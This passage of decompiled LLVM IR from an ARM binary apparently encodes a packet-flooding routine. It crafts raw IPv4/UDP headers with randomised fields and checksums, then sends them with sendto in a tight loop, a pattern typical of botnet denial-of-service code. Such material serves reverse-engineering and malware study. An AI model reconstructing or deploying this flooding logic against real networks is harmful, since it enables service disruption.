  %v4_e1ac = inttoptr i32 %v3_e1ac to i8*
  store i8 %v1_e1ac, i8* %v4_e1ac, align 1
  %v0_e1b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_e1b0 = trunc i32 %v0_e1b0 to i8
  %v2_e1b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_e1b0 = add i32 %v2_e1b0, 3
  %v4_e1b0 = inttoptr i32 %v3_e1b0 to i8*
  store i8 %v1_e1b0, i8* %v4_e1b0, align 1
  %v0_e1b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_e1b4 = trunc i32 %v0_e1b4 to i8
  %v2_e1b4 = load i32, i32* %r3.global-to-local, align 4
  %v3_e1b4 = add i32 %v2_e1b4, 4
  %v4_e1b4 = inttoptr i32 %v3_e1b4 to i8*
  store i8 %v1_e1b4, i8* %v4_e1b4, align 1
  %v0_e1b8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e1b8, i32* %stack_var_-40, align 4
  %v5_e1bc = icmp slt i32 %v0_e1a0, %v1_e1a0
  br i1 %v5_e1bc, label %dec_label_pc_e0f0, label %dec_label_pc_e1c0

dec_label_pc_e1c0:                                ; preds = %dec_label_pc_e420, %dec_label_pc_e0f0, %.thread
  %v0_e1c0 = load i32, i32* @sl, align 4
  %v2_e1c0 = icmp eq i32 %v0_e1c0, 0
  store i1 %v2_e1c0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e36c = icmp eq i32 %v3_e010, 65535
  %v2_e238 = icmp eq i32 %v1_df90, 0
  %v2_e200 = icmp eq i32 %v6_dfa4, -1
  %v7_e200 = icmp eq i32 %v6_dfa4, -1
  br label %dec_label_pc_e1c8.outer

dec_label_pc_e1c8.outer:                          ; preds = %dec_label_pc_e2e8, %dec_label_pc_e1c0
  %v1_e1c8.ph.in = phi i32 [ %v1_e2dc, %dec_label_pc_e2e8 ], [ %v0_e1c0, %dec_label_pc_e1c0 ]
  %v0_e1c8.ph = phi i1 [ %v2_e2e8, %dec_label_pc_e2e8 ], [ %v2_e1c0, %dec_label_pc_e1c0 ]
  %v1_e1c8.ph = icmp slt i32 %v1_e1c8.ph.in, 0
  %v4_e1c8 = or i1 %v1_e1c8.ph, %v0_e1c8.ph
  br label %dec_label_pc_e1c8

dec_label_pc_e1c8:                                ; preds = %dec_label_pc_e1c8.outer, %dec_label_pc_e1c8
  br i1 %v4_e1c8, label %dec_label_pc_e1c8, label %dec_label_pc_e1cc

dec_label_pc_e1cc:                                ; preds = %dec_label_pc_e1c8
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_e1d8

dec_label_pc_e1d8:                                ; preds = %dec_label_pc_e240, %dec_label_pc_e1cc
  %v1_e1ec = phi i32 [ %v1_e2d8, %dec_label_pc_e240 ], [ 0, %dec_label_pc_e1cc ]
  %v5_e1dc = mul i32 %v1_e1ec, 24
  %v1_e1e0 = load i32, i32* @r8, align 4
  %v2_e1e0 = add i32 %v1_e1e0, %v5_e1dc
  store i32 %v2_e1e0, i32* %r3.global-to-local, align 4
  store i32 %v4_de9c, i32* %ip.global-to-local, align 4
  %v1_e1e8 = add i32 %v2_e1e0, 20
  %v2_e1e8 = inttoptr i32 %v1_e1e8 to i8*
  %v3_e1e8 = load i8, i8* %v2_e1e8, align 1
  %v4_e1e8 = zext i8 %v3_e1e8 to i32
  store i32 %v4_e1e8, i32* %r2.global-to-local, align 4
  %v4_e1ec = mul i32 %v1_e1ec, 4
  %v5_e1ec = add i32 %v4_e1ec, %v4_de9c
  %v6_e1ec = inttoptr i32 %v5_e1ec to i32*
  %v7_e1ec = load i32, i32* %v6_e1ec, align 4
  store i32 %v7_e1ec, i32* @r5, align 4
  %v7_e1f0 = icmp eq i8 %v3_e1e8, 31
  store i1 %v7_e1f0, i1* %cpsr_z.global-to-local, align 1
  %v1_e1f4 = add i32 %v7_e1ec, 20
  store i32 %v1_e1f4, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_e1e8, 32
  br i1 %tmp85, label %dec_label_pc_e2f4, label %dec_label_pc_e1fc

dec_label_pc_e1fc:                                ; preds = %dec_label_pc_e1d8
  store i32 %v6_dfa4, i32* %r0.global-to-local, align 4
  store i1 %v7_e200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e200, label %dec_label_pc_e35c, label %dec_label_pc_e208

dec_label_pc_e208:                                ; preds = %dec_label_pc_e2f4, %dec_label_pc_e1fc
  store i32 %v3_e010, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_e36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e36c, label %dec_label_pc_e378, label %dec_label_pc_e21c

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e35c.dec_label_pc_e21c_crit_edge, %dec_label_pc_e208
  %v1_e220 = phi i32 [ %v1_e220.pre, %dec_label_pc_e35c.dec_label_pc_e21c_crit_edge ], [ 65535, %dec_label_pc_e208 ]
  store i32 %v3_e02c, i32* %r2.global-to-local, align 4
  %v9_e220 = icmp eq i32 %v3_e02c, %v1_e220
  store i1 %v9_e220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e220, label %dec_label_pc_e394, label %dec_label_pc_e228

dec_label_pc_e228:                                ; preds = %dec_label_pc_e378.dec_label_pc_e228_crit_edge, %dec_label_pc_e21c
  %v1_e22c = phi i32 [ %v1_e22c.pre, %dec_label_pc_e378.dec_label_pc_e228_crit_edge ], [ %v1_e220, %dec_label_pc_e21c ]
  store i32 %v3_e030, i32* %r3.global-to-local, align 4
  %v9_e22c = icmp eq i32 %v3_e030, %v1_e22c
  store i1 %v9_e22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e22c, label %dec_label_pc_e3b0, label %dec_label_pc_e234

dec_label_pc_e234:                                ; preds = %dec_label_pc_e394, %dec_label_pc_e228
  store i32 %v1_df90, i32* %ip.global-to-local, align 4
  store i1 %v2_e238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e238, label %dec_label_pc_e240, label %dec_label_pc_e3cc

dec_label_pc_e240:                                ; preds = %dec_label_pc_e234, %dec_label_pc_e3b0, %dec_label_pc_e3cc
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_e244 = load i32, i32* @r7, align 4
  %v1_e244 = trunc i32 %v0_e244 to i8
  %v2_e244 = load i32, i32* @r5, align 4
  %v3_e244 = add i32 %v2_e244, 10
  %v4_e244 = inttoptr i32 %v3_e244 to i8*
  store i8 %v1_e244, i8* %v4_e244, align 1
  %v0_e248 = load i32, i32* @r7, align 4
  %v1_e248 = trunc i32 %v0_e248 to i8
  %v2_e248 = load i32, i32* @r5, align 4
  %v3_e248 = add i32 %v2_e248, 11
  %v4_e248 = inttoptr i32 %v3_e248 to i8*
  store i8 %v1_e248, i8* %v4_e248, align 1
  %v0_e24c = load i32, i32* @r5, align 4
  store i32 %v0_e24c, i32* @r0, align 4
  %v2_e250 = call i32 @function_f17c(i32 %v0_e24c, i32 20)
  %v3_e250 = trunc i32 %v2_e250 to i8
  store i32 %v2_e250, i32* %r0.global-to-local, align 4
  %v4_e254 = sdiv i32 %v2_e250, 256
  store i32 %v4_e254, i32* %r3.global-to-local, align 4
  %v1_e258 = trunc i32 %v4_e254 to i8
  %v2_e258 = load i32, i32* @r5, align 4
  %v3_e258 = add i32 %v2_e258, 11
  %v4_e258 = inttoptr i32 %v3_e258 to i8*
  store i8 %v1_e258, i8* %v4_e258, align 1
  %v3_e25c = load i32, i32* @r5, align 4
  %v4_e25c = add i32 %v3_e25c, 10
  %v5_e25c = inttoptr i32 %v4_e25c to i8*
  store i8 %v3_e250, i8* %v5_e25c, align 1
  %v0_e260 = load i32, i32* @r7, align 4
  %v1_e260 = trunc i32 %v0_e260 to i8
  %v2_e260 = load i32, i32* @r6, align 4
  %v3_e260 = add i32 %v2_e260, 6
  %v4_e260 = inttoptr i32 %v3_e260 to i8*
  store i8 %v1_e260, i8* %v4_e260, align 1
  %v0_e264 = load i32, i32* @r7, align 4
  %v1_e264 = trunc i32 %v0_e264 to i8
  %v2_e264 = load i32, i32* @r6, align 4
  %v3_e264 = add i32 %v2_e264, 7
  %v4_e264 = inttoptr i32 %v3_e264 to i8*
  store i8 %v1_e264, i8* %v4_e264, align 1
  %v0_e268 = load i32, i32* @r5, align 4
  %v1_e268 = add i32 %v0_e268, 24
  %v2_e268 = inttoptr i32 %v1_e268 to i8*
  %v3_e268 = load i8, i8* %v2_e268, align 1
  %v4_e268 = zext i8 %v3_e268 to i32
  store i32 %v4_e268, i32* %r3.global-to-local, align 4
  %v1_e26c = add i32 %v0_e268, 25
  %v2_e26c = inttoptr i32 %v1_e26c to i8*
  %v3_e26c = load i8, i8* %v2_e26c, align 1
  %v4_e26c = zext i8 %v3_e26c to i32
  %v0_e270 = load i32, i32* @r6, align 4
  store i32 %v0_e270, i32* @r1, align 4
  %v4_e274 = mul nuw nsw i32 %v4_e26c, 256
  %v5_e274 = or i32 %v4_e274, %v4_e268
  store i32 %v5_e274, i32* %r2.global-to-local, align 4
  store i32 %v0_e268, i32* %r0.global-to-local, align 4
  %v0_e27c = load i32, i32* @sb, align 4
  store i32 %v0_e27c, i32* %r3.global-to-local, align 4
  %v4_e280 = call i32 @function_f1d8(i32 %v0_e268, i32 %v0_e270, i32 %v5_e274, i32 %v0_e27c)
  %v5_e280 = trunc i32 %v4_e280 to i8
  store i32 %v4_e280, i32* %r0.global-to-local, align 4
  %v4_e28439 = udiv i32 %v4_e280, 256
  %v1_e288 = trunc i32 %v4_e28439 to i8
  %v2_e288 = load i32, i32* @r6, align 4
  %v3_e288 = add i32 %v2_e288, 7
  %v4_e288 = inttoptr i32 %v3_e288 to i8*
  store i8 %v1_e288, i8* %v4_e288, align 1
  %v3_e28c = load i32, i32* @r6, align 4
  %v4_e28c = add i32 %v3_e28c, 6
  %v5_e28c = inttoptr i32 %v4_e28c to i8*
  store i8 %v5_e280, i8* %v5_e28c, align 1
  %v3_e290 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e290, i32* %r3.global-to-local, align 4
  %v0_e294 = load i32, i32* @r5, align 4
  %v1_e294 = add i32 %v0_e294, 20
  %v2_e294 = inttoptr i32 %v1_e294 to i32*
  %v3_e294 = load i32, i32* %v2_e294, align 4
  %v3_e29c = udiv i32 %v3_e294, 65536
  store i32 %v3_e29c, i32* %r2.global-to-local, align 4
  %v5_e2a0 = mul i32 %v3_e290, 24
  %v1_e2a4 = load i32, i32* @r8, align 4
  %v2_e2a4 = add i32 %v1_e2a4, %v5_e2a0
  store i32 %v2_e2a4, i32* %ip.global-to-local, align 4
  %v3_e2a836 = udiv i32 %v3_e294, 16777216
  %v1_e2ac = trunc i32 %v3_e2a836 to i8
  %v3_e2ac = add i32 %v2_e2a4, 3
  %v4_e2ac = inttoptr i32 %v3_e2ac to i8*
  store i8 %v1_e2ac, i8* %v4_e2ac, align 1
  %v0_e2b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2b0 = trunc i32 %v0_e2b0 to i8
  %v2_e2b0 = load i32, i32* %ip.global-to-local, align 4
  %v3_e2b0 = add i32 %v2_e2b0, 2
  %v4_e2b0 = inttoptr i32 %v3_e2b0 to i8*
  store i8 %v1_e2b0, i8* %v4_e2b0, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e2b8 = load i32, i32* @r5, align 4
  store i32 %v0_e2b8, i32* %r1.global-to-local, align 4
  store i32 %v3_dfb8, i32* %r0.global-to-local, align 4
  %v0_e2c0 = load i32, i32* @fp, align 4
  store i32 %v0_e2c0, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_e2c8 = load i32, i32* %ip.global-to-local, align 4
  %v4_e2c8 = inttoptr i32 %v0_e2c8 to %sockaddr*
  %v7_e2d0 = inttoptr i32 %v0_e2b8 to i32*
  %v9_e2d0 = call i32 @sendto(i32 %v3_dfb8, i32* %v7_e2d0, i32 %v0_e2c0, i32 16384, %sockaddr* %v4_e2c8, i32 16)
  %v3_e2d4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e2d4, i32* %r3.global-to-local, align 4
  %v1_e2d8 = add i32 %v3_e2d4, 1
  store i32 %v1_e2d8, i32* %r0.global-to-local, align 4
  %v1_e2dc = load i32, i32* @sl, align 4
  %v9_e2dc = icmp eq i32 %v1_e2d8, %v1_e2dc
  store i1 %v9_e2dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e2d8, i32* %stack_var_-40, align 4
  %v5_e2e4 = icmp slt i32 %v1_e2d8, %v1_e2dc
  br i1 %v5_e2e4, label %dec_label_pc_e1d8, label %dec_label_pc_e2e8

dec_label_pc_e2e8:                                ; preds = %dec_label_pc_e240
  %v2_e2e8 = icmp eq i32 %v1_e2dc, 0
  store i1 %v2_e2e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e1c8.outer

dec_label_pc_e2f4:                                ; preds = %dec_label_pc_e1d8
  %v1_e2f4 = add i32 %v2_e1e0, 16
  %v2_e2f4 = inttoptr i32 %v1_e2f4 to i32*
  %v3_e2f4 = load i32, i32* %v2_e2f4, align 4
  store i32 %v3_e2f4, i32* %r4.global-to-local, align 4
  %v0_e2f8 = call i32 @function_10b68()
  store i32 %v0_e2f8, i32* %r0.global-to-local, align 4
  %v3_e2fc = load i32, i32* %stack_var_-40, align 4
  %v5_e304 = mul i32 %v3_e2fc, 24
  %v1_e30c = load i32, i32* @r8, align 4
  %v2_e30c = add i32 %v1_e30c, %v5_e304
  store i32 %v2_e30c, i32* %r1.global-to-local, align 4
  %v1_e310 = and i32 %v3_e2f4, 65280
  store i32 %v1_e310, i32* %r3.global-to-local, align 4
  %v1_e308 = udiv i32 %v3_e2f4, 256
  %v3_e314 = and i32 %v1_e308, 65280
  store i32 %v3_e314, i32* %r2.global-to-local, align 4
  %v3_e318 = mul i32 %v3_e2f4, 16777216
  store i32 %v3_e318, i32* %ip.global-to-local, align 4
  %v1_e31c = add i32 %v2_e30c, 20
  %v2_e31c = inttoptr i32 %v1_e31c to i8*
  %v3_e31c = load i8, i8* %v2_e31c, align 1
  %v4_e31c = zext i8 %v3_e31c to i32
  %v4_e320 = mul nuw nsw i32 %v1_e310, 256
  %v5_e320 = or i32 %v4_e320, %v3_e318
  store i32 %v5_e320, i32* %ip.global-to-local, align 4
  %v2_e328 = call i32 @llvm.bswap.i32(i32 %v3_e2f4)
  %v7_e32c = lshr i32 %v0_e2f8, %v4_e31c
  %v8_e32c = add i32 %v7_e32c, %v2_e328
  store i32 %v8_e32c, i32* %r2.global-to-local, align 4
  %v3_e338 = mul i32 %v8_e32c, 16777216
  %v1_e330 = mul i32 %v8_e32c, 256
  %v4_e33c = and i32 %v1_e330, 16711680
  %v5_e33c = or i32 %v4_e33c, %v3_e338
  store i32 %v5_e33c, i32* %r1.global-to-local, align 4
  store i32 %v6_dfa4, i32* %r0.global-to-local, align 4
  %v2_e34c = call i32 @llvm.bswap.i32(i32 %v8_e32c)
  store i32 %v2_e34c, i32* %r3.global-to-local, align 4
  store i1 %v7_e200, i1* %cpsr_z.global-to-local, align 1
  %v1_e354 = load i32, i32* @r5, align 4
  %v2_e354 = add i32 %v1_e354, 16
  %v3_e354 = inttoptr i32 %v2_e354 to i32*
  store i32 %v2_e34c, i32* %v3_e354, align 4
  br i1 %v2_e200, label %dec_label_pc_e35c, label %dec_label_pc_e208

dec_label_pc_e35c:                                ; preds = %dec_label_pc_e2f4, %dec_label_pc_e1fc
  %v0_e35c = call i32 @function_10b68()
  store i32 %v0_e35c, i32* %r0.global-to-local, align 4
  store i32 %v3_e010, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_e36c, i1* %cpsr_z.global-to-local, align 1
  %v1_e370 = load i32, i32* @r5, align 4
  %v2_e370 = add i32 %v1_e370, 12
  %v3_e370 = inttoptr i32 %v2_e370 to i32*
  store i32 %v0_e35c, i32* %v3_e370, align 4
  br i1 %v3_e36c, label %dec_label_pc_e378, label %dec_label_pc_e35c.dec_label_pc_e21c_crit_edge

dec_label_pc_e35c.dec_label_pc_e21c_crit_edge:    ; preds = %dec_label_pc_e35c
  %v1_e220.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e21c

dec_label_pc_e378:                                ; preds = %dec_label_pc_e35c, %dec_label_pc_e208
  %v0_e378 = call i32 @function_10b68()
  %v1_e378 = trunc i32 %v0_e378 to i8
  store i32 %v0_e378, i32* %r0.global-to-local, align 4
  store i32 %v3_e02c, i32* %r2.global-to-local, align 4
  %v4_e380 = sdiv i32 %v0_e378, 256
  store i32 %v4_e380, i32* %r3.global-to-local, align 4
  %v1_e384 = load i32, i32* @r4, align 4
  %v9_e384 = icmp eq i32 %v3_e02c, %v1_e384
  store i1 %v9_e384, i1* %cpsr_z.global-to-local, align 1
  %v1_e388 = trunc i32 %v4_e380 to i8
  %v2_e388 = load i32, i32* @r5, align 4
  %v3_e388 = add i32 %v2_e388, 5
  %v4_e388 = inttoptr i32 %v3_e388 to i8*
  store i8 %v1_e388, i8* %v4_e388, align 1
  %v3_e38c = load i32, i32* @r5, align 4
  %v4_e38c = add i32 %v3_e38c, 4
  %v5_e38c = inttoptr i32 %v4_e38c to i8*
  store i8 %v1_e378, i8* %v5_e38c, align 1
  %v0_e390 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e390, label %dec_label_pc_e394, label %dec_label_pc_e378.dec_label_pc_e228_crit_edge

dec_label_pc_e378.dec_label_pc_e228_crit_edge:    ; preds = %dec_label_pc_e378
  %v1_e22c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e228

dec_label_pc_e394:                                ; preds = %dec_label_pc_e378, %dec_label_pc_e21c
  %v0_e394 = call i32 @function_10b68()
  %v1_e394 = trunc i32 %v0_e394 to i8
  store i32 %v0_e394, i32* %r0.global-to-local, align 4
  %v4_e398 = sdiv i32 %v0_e394, 256
  store i32 %v4_e398, i32* %r3.global-to-local, align 4
  %v3_e39c = load i32, i32* @r5, align 4
  %v4_e39c = add i32 %v3_e39c, 20
  %v5_e39c = inttoptr i32 %v4_e39c to i8*
  store i8 %v1_e394, i8* %v5_e39c, align 1
  %v0_e3a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e3a0 = trunc i32 %v0_e3a0 to i8
  %v2_e3a0 = load i32, i32* @r6, align 4
  %v3_e3a0 = add i32 %v2_e3a0, 1
  %v4_e3a0 = inttoptr i32 %v3_e3a0 to i8*
  store i8 %v1_e3a0, i8* %v4_e3a0, align 1
  store i32 %v3_e030, i32* %r3.global-to-local, align 4
  %v1_e3a8 = load i32, i32* @r4, align 4
  %v9_e3a8 = icmp eq i32 %v3_e030, %v1_e3a8
  store i1 %v9_e3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e3a8, label %dec_label_pc_e3b0, label %dec_label_pc_e234

dec_label_pc_e3b0:                                ; preds = %dec_label_pc_e394, %dec_label_pc_e228
  %v0_e3b0 = call i32 @function_10b68()
  %v1_e3b0 = trunc i32 %v0_e3b0 to i8
  store i32 %v0_e3b0, i32* %r0.global-to-local, align 4
  store i32 %v1_df90, i32* %ip.global-to-local, align 4
  %v4_e3b8 = sdiv i32 %v0_e3b0, 256
  store i32 %v4_e3b8, i32* %r3.global-to-local, align 4
  store i1 %v2_e238, i1* %cpsr_z.global-to-local, align 1
  %v1_e3c0 = trunc i32 %v4_e3b8 to i8
  %v2_e3c0 = load i32, i32* @r6, align 4
  %v3_e3c0 = add i32 %v2_e3c0, 3
  %v4_e3c0 = inttoptr i32 %v3_e3c0 to i8*
  store i8 %v1_e3c0, i8* %v4_e3c0, align 1
  %v3_e3c4 = load i32, i32* @r6, align 4
  %v4_e3c4 = add i32 %v3_e3c4, 2
  %v5_e3c4 = inttoptr i32 %v4_e3c4 to i8*
  store i8 %v1_e3b0, i8* %v5_e3c4, align 1
  %v0_e3c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e3c8, label %dec_label_pc_e240, label %dec_label_pc_e3cc

dec_label_pc_e3cc:                                ; preds = %dec_label_pc_e234, %dec_label_pc_e3b0
  %v0_e3cc = load i32, i32* @r5, align 4
  %v1_e3cc = add i32 %v0_e3cc, 28
  store i32 %v1_e3cc, i32* %r0.global-to-local, align 4
  store i32 %v0_e008, i32* @r1, align 4
  %v1_e3d4 = inttoptr i32 %v1_e3cc to i8*
  %v2_e3d4 = call i32 @function_10d44(i8* %v1_e3d4)
  store i32 %v2_e3d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e240

dec_label_pc_e3dc:                                ; preds = %dec_label_pc_dfc8
  store i32 %v3_dfb8, i32* %r0.global-to-local, align 4
  %v1_e3e0 = call i32 @close(i32 %v3_dfb8)
  store i32 %v1_e3e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3e4

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_de7c, %dec_label_pc_e3dc
  %v29_e3e8 = phi i32 [ %v3_dfb8, %dec_label_pc_de7c ], [ %v1_e3e0, %dec_label_pc_e3dc ]
  store i32 %v3_de7c, i32* %r4.global-to-local, align 4
  store i32 %v6_de7c, i32* %r5.global-to-local, align 4
  store i32 %v9_de7c, i32* %r6.global-to-local, align 4
  store i32 %v12_de7c, i32* %r7.global-to-local, align 4
  store i32 %v18_de7c, i32* %sb.global-to-local, align 4
  store i32 %v24_de7c, i32* %fp.global-to-local, align 4
  ret i32 %v29_e3e8

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e04c
  %v3_e3f0 = sext i8 %v5_e0b0 to i32
  %v7_e3f0 = sext i8 %v5_e0b4 to i32
  %v3_e3f4 = sdiv i32 %v3_e3f0, 256
  store i32 %v3_e3f4, i32* %r0.global-to-local, align 4
  %v3_e3f8 = sdiv i32 %v7_e3f0, 256
  store i32 %v3_e3f8, i32* %r1.global-to-local, align 4
  store i32 %v1_e088, i32* %r2.global-to-local, align 4
  store i32 %v1_e08c, i32* %r3.global-to-local, align 4
  %v3_e40435 = udiv i32 %v1_e0a4, 256
  store i32 %v3_e40435, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_e470 = sext i8 %v5_df0c to i32
  %sext12 = mul i32 %v1_e080, 16777216
  %v4_e4c8 = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v0_e01c, 16777216
  %v4_e4cc = sdiv i32 %sext13, 16777216
  %sext14 = mul i32 %v0_e018, 16777216
  %v4_e4e8 = sdiv i32 %sext14, 16777216
  %v1_e4d4 = trunc i32 %v3_e3f8 to i8
  %v1_e4f0 = trunc i32 %v4_e4e8 to i8
  br label %dec_label_pc_e420

dec_label_pc_e420:                                ; preds = %dec_label_pc_e420, %dec_label_pc_e3ec
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_e42c = call i32* @calloc(i32 1510, i32 1)
  %v4_e42c = ptrtoint i32* %v2_e42c to i32
  store i32 %v4_e42c, i32* %r0.global-to-local, align 4
  store i32 %v4_de9c, i32* %r1.global-to-local, align 4
  %v3_e434 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e434, i32* %r2.global-to-local, align 4
  %v2_e438 = load i32, i32* %r6.global-to-local, align 4
  %v5_e438 = mul i32 %v2_e438, 4
  %v6_e438 = add i32 %v5_e438, %v4_de9c
  %v7_e438 = inttoptr i32 %v6_e438 to i32*
  store i32 %v4_e42c, i32* %v7_e438, align 4
  %v0_e43c = load i32, i32* %r1.global-to-local, align 4
  %v1_e43c = load i32, i32* %r2.global-to-local, align 4
  %v4_e43c = mul i32 %v1_e43c, 4
  %v5_e43c = add i32 %v4_e43c, %v0_e43c
  %v6_e43c = inttoptr i32 %v5_e43c to i32*
  %v7_e43c = load i32, i32* %v6_e43c, align 4
  store i32 %v7_e43c, i32* %r1.global-to-local, align 4
  %v1_e440 = inttoptr i32 %v7_e43c to i8*
  %v2_e440 = load i8, i8* %v1_e440, align 1
  %tmp86 = urem i8 %v2_e440, 16
  %v1_e444 = zext i8 %tmp86 to i32
  %v1_e448 = or i32 %v1_e444, 64
  store i32 %v1_e448, i32* %r3.global-to-local, align 4
  %v1_e44c = trunc i32 %v1_e448 to i8
  store i8 %v1_e44c, i8* %v1_e440, align 1
  %v0_e450 = load i32, i32* %r1.global-to-local, align 4
  %v1_e450 = inttoptr i32 %v0_e450 to i8*
  %v2_e450 = load i8, i8* %v1_e450, align 1
  %v3_e450 = zext i8 %v2_e450 to i32
  %v1_e454 = and i32 %v3_e450, 240
  %v1_e458 = or i32 %v1_e454, 5
  store i32 %v1_e458, i32* %r2.global-to-local, align 4
  %v3_e460 = add i32 %v0_e450, 9
  %v4_e460 = inttoptr i32 %v3_e460 to i8*
  store i8 17, i8* %v4_e460, align 1
  %v0_e464 = load i32, i32* %r2.global-to-local, align 4
  %v1_e464 = trunc i32 %v0_e464 to i8
  %v2_e464 = load i32, i32* %r1.global-to-local, align 4
  %v3_e464 = inttoptr i32 %v2_e464 to i8*
  store i8 %v1_e464, i8* %v3_e464, align 1
  %v2_e46c = load i32, i32* %r1.global-to-local, align 4
  %v3_e46c = add i32 %v2_e46c, 1
  %v4_e46c = inttoptr i32 %v3_e46c to i8*
  store i8 %v5_ded4, i8* %v4_e46c, align 1
  store i32 %v4_e470, i32* %r0.global-to-local, align 4
  %v2_e474 = load i32, i32* %r1.global-to-local, align 4
  %v3_e474 = add i32 %v2_e474, 8
  %v4_e474 = inttoptr i32 %v3_e474 to i8*
  store i8 %v5_df0c, i8* %v4_e474, align 1
  %v3_e478 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e478, i32* %r2.global-to-local, align 4
  store i32 %v6_dfa4, i32* %ip.global-to-local, align 4
  %v3_e480 = mul i32 %v3_e478, 32
  store i32 %v3_e480, i32* %r3.global-to-local, align 4
  %v1_e484 = load i32, i32* %r1.global-to-local, align 4
  %v2_e484 = add i32 %v1_e484, 12
  %v3_e484 = inttoptr i32 %v2_e484 to i32*
  store i32 %v6_dfa4, i32* %v3_e484, align 4
  %v0_e488 = load i32, i32* %r3.global-to-local, align 4
  %v1_e488 = load i32, i32* %r2.global-to-local, align 4
  %tmp87 = mul i32 %v1_e488, -8
  %v5_e488 = add i32 %v0_e488, %tmp87
  %v1_e48c = load i32, i32* @r8, align 4
  %v2_e48c = add i32 %v5_e488, %v1_e48c
  store i32 %v2_e48c, i32* %r3.global-to-local, align 4
  %v1_e490 = add i32 %v2_e48c, 16
  %v2_e490 = inttoptr i32 %v1_e490 to i32*
  %v3_e490 = load i32, i32* %v2_e490, align 4
  store i32 %v3_e490, i32* %ip.global-to-local, align 4
  %v1_e494 = add i32 %v1_e488, 1
  store i32 %v1_e494, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e4a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4a0 = add i32 %v2_e4a0, 6
  %v4_e4a0 = inttoptr i32 %v3_e4a0 to i8*
  store i8 64, i8* %v4_e4a0, align 1
  %v0_e4a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4a4 = trunc i32 %v0_e4a4 to i8
  %v2_e4a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4a4 = add i32 %v2_e4a4, 7
  %v4_e4a4 = inttoptr i32 %v3_e4a4 to i8*
  store i8 %v1_e4a4, i8* %v4_e4a4, align 1
  %v0_e4a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_e4a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_e4a8 = add i32 %v1_e4a8, 16
  %v3_e4a8 = inttoptr i32 %v2_e4a8 to i32*
  store i32 %v0_e4a8, i32* %v3_e4a8, align 4
  store i32 %v3_e3f4, i32* %r3.global-to-local, align 4
  store i32 %v7_e3f0, i32* %ip.global-to-local, align 4
  %v2_e4b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4b8 = add i32 %v2_e4b8, 2
  %v4_e4b8 = inttoptr i32 %v3_e4b8 to i8*
  store i8 %v5_e0b0, i8* %v4_e4b8, align 1
  %v0_e4bc = load i32, i32* %r3.global-to-local, align 4
  %v1_e4bc = trunc i32 %v0_e4bc to i8
  %v2_e4bc = load i32, i32* %r1.global-to-local, align 4
  %v3_e4bc = add i32 %v2_e4bc, 3
  %v4_e4bc = inttoptr i32 %v3_e4bc to i8*
  store i8 %v1_e4bc, i8* %v4_e4bc, align 1
  %v0_e4c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_e4c0 = trunc i32 %v0_e4c0 to i8
  %v2_e4c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4c0 = add i32 %v2_e4c0, 4
  %v4_e4c0 = inttoptr i32 %v3_e4c0 to i8*
  store i8 %v1_e4c0, i8* %v4_e4c0, align 1
  store i32 %v3_e3f8, i32* %r2.global-to-local, align 4
  store i32 %v4_e4c8, i32* %r3.global-to-local, align 4
  store i32 %v4_e4cc, i32* %ip.global-to-local, align 4
  %v0_e4d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_e4d0 = add i32 %v0_e4d0, 20
  store i32 %v1_e4d0, i32* %r0.global-to-local, align 4
  %v3_e4d4 = add i32 %v0_e4d0, 5
  %v4_e4d4 = inttoptr i32 %v3_e4d4 to i8*
  store i8 %v1_e4d4, i8* %v4_e4d4, align 1
  %v0_e4d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_e4d8 = trunc i32 %v0_e4d8 to i8
  %v2_e4d8 = load i32, i32* %r1.global-to-local, align 4
